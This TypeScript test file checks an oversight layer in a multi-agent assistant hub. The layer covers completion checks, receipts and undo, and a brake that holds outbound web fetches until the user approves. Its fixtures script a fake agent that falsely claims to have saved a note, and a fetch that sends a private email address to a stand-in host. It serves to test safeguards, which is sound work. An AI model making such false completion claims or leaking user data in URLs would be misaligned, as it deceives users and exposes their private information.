import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { fake } from '@monsters/providers/testing';
import {
  defineTool,
  type EventType,
  type InstinctView,
  type LogEvent,
  type Receipt,
  type ScorecardView,
  type UndoRunResult,
} from '@monsters/shared';
import { describe, expect, it } from 'vitest';
import { z } from 'zod';
import type { DecisionPort, SystemOneAnswer } from '../src/index.ts';
import { tempHome } from './helpers.ts';
import { fakeWebSearch, promptText, startTestHub } from './hub-helpers.ts';

/*
 * The instinct inside the real core (D-067): "finito davvero?" with its
 * reminder, the receipt and "Annulla tutto", the brake on an outbound action,
 * the radiografia's hint, and the settings API. The engine is a fake port.
 */

type Sent = { runId: string };

/** A fake engine: answers every question with `values[id]`, or `fallback`. */
function port(
  values: Record<string, number | string>,
  fallback = 0.5,
): DecisionPort & { asked: string[][] } {
  const asked: string[][] = [];
  return {
    id: 'jev',
    asked,
    decide: (request) => {
      asked.push(request.questions.map((q) => q.id));
      const answers: SystemOneAnswer[] = request.questions.map((q) => {
        const v = values[q.id] ?? (q.type === 'choice' ? optionOf(q.options[0]) : fallback);
        return { id: q.id, value: v, confidence: 0.9 };
      });
      return Promise.resolve({ answers, model: 'jev-1.13.0' });
    },
  };
}
const optionOf = (o: unknown) => (typeof o === 'string' ? o : (o as { label: string }).label);

const ofType = <T extends EventType>(events: LogEvent[], type: T): LogEvent<T>[] =>
  events.filter((e) => e.type === type) as LogEvent<T>[];

describe('instinct in the core (D-067)', () => {
  it('"finito davvero?": a note declared and never saved gets a reminder; the receipt and "Annulla tutto"', async () => {
    const t = await startTestHub({
      titan: [
        fake.toolCall('delegate', {
          agent: 'Dione',
          goal: 'Un post sulle tisane',
          done_when: 'bozza salvata in una nota',
        }),
        fake.text('La bozza è pronta.'),
      ],
      dione: [
        fake.text('Ho salvato la bozza nella nota Inbox/Bozze/Tisane.'),
        // After the reminder Dione saves it for real.
        fake.toolCall('vault_write', {
          path: 'Inbox/Bozze/Tisane',
          content: '# Tisane\n\nUn post caldo sulle tisane d’autunno.\n',
        }),
        fake.text('Bozza salvata in Inbox/Bozze/Tisane.md.'),
      ],
    });
    const sent = await t.json<Sent>('POST', '/api/messages', {
      text: 'Scrivi un post sulle tisane',
    });
    expect((await t.runEnded(sent.runId)).data.status).toBe('completed');
    const events = t.events(sent.runId);
    const reminder = ofType(events, 'message').find(
      (e) => e.agent === 'dione' && e.data.role === 'system',
    );
    expect(reminder?.data.text).toMatch(/Il lavoro non sembra finito/);
    const done = ofType(events, 'delegation').find((e) => e.data.status === 'completed')!;
    // Without an engine the code checks only (the note is there now): retried, not verified.
    expect(done.data.check).toMatchObject({ retried: true });
    expect(done.data.summary).toBe('Bozza salvata in Inbox/Bozze/Tisane.md.');
    expect(done.data).toMatchObject({ model: 'fake:dione', steps: expect.any(Number) as unknown });
    expect(ofType(events, 'instinct').map((e) => e.data.action)).toContain('retry');

    const receipts = await t.json<Receipt[]>('GET', `/api/runs/${sent.runId}/receipts`);
    expect(receipts).toHaveLength(1);
    expect(receipts[0]).toMatchObject({
      request: 'Scrivi un post sulle tisane',
      agent: 'titan',
      status: 'completed',
      delegations: [{ agent: 'dione', agentName: 'Dione', goal: 'Un post sulle tisane' }],
      notes: [{ path: 'Inbox/Bozze/Tisane.md', action: 'create', agent: 'dione' }],
      undoable: true,
    });
    expect(receipts[0]!.notes[0]!.commit).toBeDefined();

    const undone = await t.json<UndoRunResult>('POST', `/api/runs/${sent.runId}/undo`);
    expect(undone.undone).toHaveLength(1);
    expect(undone.failed).toEqual([]);
    const notFound = await t.api('POST', '/api/runs/01JAAAAAAAAAAAAAAAAAAAAAAA/undo');
    expect(notFound.status).toBe(404);
  });

  it('with an engine: verified criteria on the delegation, the pagella counts it', async () => {
    const engine = port({ done: 0.92 });
    const t = await startTestHub(
      {
        titan: [
          fake.toolCall('delegate', {
            agent: 'Rhea',
            goal: 'Le lune di Saturno',
            done_when: 'tre lune con fonte',
          }),
          fake.text('Ecco le lune.'),
        ],
        rhea: [
          fake.toolCall('web_search', { query: 'lune di Saturno' }),
          fake.text('Titano, Rea e Giapeto, con le fonti.'),
        ],
      },
      { hub: { decisionPort: engine, settings: { instinct: { engine: 'jev' } } } },
    );
    const sent = await t.json<Sent>('POST', '/api/messages', { text: 'Le lune di Saturno?' });
    await t.runEnded(sent.runId);
    const done = ofType(t.events(sent.runId), 'delegation').find(
      (e) => e.data.status === 'completed',
    )!;
    expect(done.data.check).toMatchObject({
      verdict: 'verified',
      criteria: [{ text: 'tre lune con fonte', ok: true, by: 'model' }],
    });
    const report = ofType(t.events(sent.runId), 'tool_result').find(
      (e) => e.data.tool === 'delegate',
    );
    expect(report?.data.output).toMatchObject({ check: 'ok' });
    const card = await t.json<ScorecardView>('GET', '/api/instinct/scorecard');
    expect(card).toMatchObject({ enabled: true, minDelegations: 20 });
    expect(card.rows).toContainEqual(
      expect.objectContaining({ agent: 'rhea', model: 'fake:rhea', verified: 1, checked: 1 }),
    );
    // The radiografia ran too (route, web), in one call before the orchestrator's first step.
    expect(engine.asked[0]).toEqual(expect.arrayContaining(['route', 'route_rev']));
  });

  it('the radiografia puts its hint in the first message of the orchestrator', async () => {
    const engine = port({ route: 'Rhea', route_rev: 'Rhea' });
    const t = await startTestHub(
      { titan: [fake.text('Ciao!')] },
      { hub: { decisionPort: engine, settings: { instinct: { engine: 'jev' } } } },
    );
    const sent = await t.json<Sent>('POST', '/api/messages', { text: 'Cerca i prezzi del caffè' });
    await t.runEnded(sent.runId);
    expect(promptText(t.provider.calls[0]!.options.prompt)).toContain('sembra adatto: Rhea');
    expect(ofType(t.events(sent.runId), 'instinct')[0]!.data).toMatchObject({
      use: 'route_hint',
      message: 'Ho suggerito di affidare la richiesta a Rhea.',
    });
  });

  it('the brake: a web page with private data in the address waits for the user', async () => {
    let fetched = 0;
    const webFetch = defineTool({
      name: 'web_fetch',
      description: 'Reads a page.',
      inputSchema: z.object({ url: z.string() }),
      readOnly: false,
      execute: () => {
        fetched++;
        return Promise.resolve({ url: 'x', content: 'ok' });
      },
    });
    const t = await startTestHub(
      {
        rhea: [
          fake.toolCall('web_fetch', { url: 'https://raccolta.example/?d=giulio@example.com' }),
          fake.text('Fatto.'),
        ],
      },
      { hub: { webTools: [fakeWebSearch, webFetch] } },
    );
    const sent = await t.json<Sent>('POST', '/api/messages', { text: '@Rhea apri la pagina' });
    const question = await t.waitEvent(
      (e): e is LogEvent<'question'> => e.type === 'question' && e.runId === sent.runId,
    );
    expect(question.data.question).toMatch(
      /^Rhea vuole aprire un indirizzo che contiene dati privati/,
    );
    expect(fetched).toBe(0);
    // A message that is not a yes or a no is for the monster, not the answer to the card.
    const typed = await t.json<Sent & { answered?: string }>('POST', '/api/messages', {
      text: '@Rhea aspetta, prima scrivi a Marco',
    });
    expect(typed.answered).toBeUndefined();
    await t.json('POST', `/api/questions/${question.data.questionId}/answer`, { optionId: '2' });
    await t.runEnded(sent.runId);
    expect(fetched).toBe(0);
    const [receipt] = await t.json<Receipt[]>('GET', `/api/runs/${sent.runId}/receipts`);
    expect(receipt!.outbound).toEqual([
      expect.objectContaining({
        agent: 'rhea',
        tool: 'web_fetch',
        category: 'contact',
        outcome: 'refused',
      }),
    ]);
  });

  it('the brake: «va bene» typed in the chat is a yes, «quella» is not an answer', async () => {
    let fetched = 0;
    const webFetch = defineTool({
      name: 'web_fetch',
      description: 'Reads a page.',
      inputSchema: z.object({ url: z.string() }),
      readOnly: false,
      execute: () => {
        fetched++;
        return Promise.resolve({ url: 'x', content: 'ok' });
      },
    });
    const t = await startTestHub(
      {
        rhea: [
          fake.toolCall('web_fetch', { url: 'https://raccolta.example/?d=giulio@example.com' }),
          fake.text('Fatto.'),
        ],
      },
      { hub: { webTools: [fakeWebSearch, webFetch] } },
    );
    const sent = await t.json<Sent>('POST', '/api/messages', { text: '@Rhea apri la pagina' });
    const question = await t.waitEvent(
      (e): e is LogEvent<'question'> => e.type === 'question' && e.runId === sent.runId,
    );
    const vague = await t.json<Sent & { answered?: string }>('POST', '/api/messages', {
      text: '@Rhea quella',
    });
    expect(vague.answered).toBeUndefined();
    // Through the CLI token (a monster with the terminal can read it) it is a message, never
    // the answer of a card of the brake (review of 18/10, M1).
    const viaToken = await t.json<Sent & { answered?: string }>('POST', '/api/messages', {
      text: '@Rhea va bene',
    });
    expect(viaToken.answered).toBeUndefined();
    // A yes with a condition is a message for the monster, never the approval.
    for (const text of ['sì ma non mandarla a Marco', 'ok però prima chiedi a Luca']) {
      const but = await t.ownerJson<Sent & { answered?: string }>('POST', '/api/messages', {
        text: `@Rhea ${text}`,
      });
      expect(but.answered, text).toBeUndefined();
    }
    expect(fetched).toBe(0);
    const typed = await t.ownerJson<Sent & { answered?: string }>('POST', '/api/messages', {
      text: '@Rhea va bene',
    });
    expect(typed.answered).toBe(question.data.questionId);
    await t.runEnded(sent.runId);
    expect(fetched).toBe(1);
  });

  it('settings: engine and modes of the uses, the legacy engine moved to `instinct`', async () => {
    const home = tempHome();
    mkdirSync(home, { recursive: true });
    writeFileSync(join(home, 'settings.json'), JSON.stringify({ decisions: { engine: 'llm' } }));
    const t = await startTestHub({}, { home, hub: { decisionPort: undefined } });
    const view = await t.json<InstinctView>('GET', '/api/settings/instinct');
    expect(view).toMatchObject({
      title: 'Monsters’ decisions',
      engine: 'llm',
      engineSource: 'user',
    });
    expect(view.uses.find((u) => u.id === 'shortcut')).toMatchObject({
      mode: 'shadow',
      modes: ['off', 'shadow'],
    });
    expect(view.uses.find((u) => u.id === 'injection')).toMatchObject({
      mode: 'on',
      active: false,
    });
    const file = JSON.parse(readFileSync(join(home, 'settings.json'), 'utf8')) as Record<
      string,
      unknown
    >;
    expect(file).toMatchObject({ instinct: { engine: 'llm' } });
    expect(file['decisions']).not.toHaveProperty('engine');

    const next = await t.json<InstinctView>('PUT', '/api/settings/instinct', {
      engine: 'rules',
      uses: { stuck: 'shadow' },
    });
    expect(next.engine).toBe('rules');
    expect(next.uses.find((u) => u.id === 'stuck')).toMatchObject({ mode: 'shadow' });
    const no = await t.api('PUT', '/api/settings/instinct', { uses: { shortcut: 'on' } });
    expect(no.status).toBe(400);
    expect(await no.json()).toMatchObject({ error: 'mode_not_available' });
    const noKey = await t.api('PUT', '/api/settings/instinct', { engine: 'jev' });
    expect(noKey.status).toBe(409);
  });
});
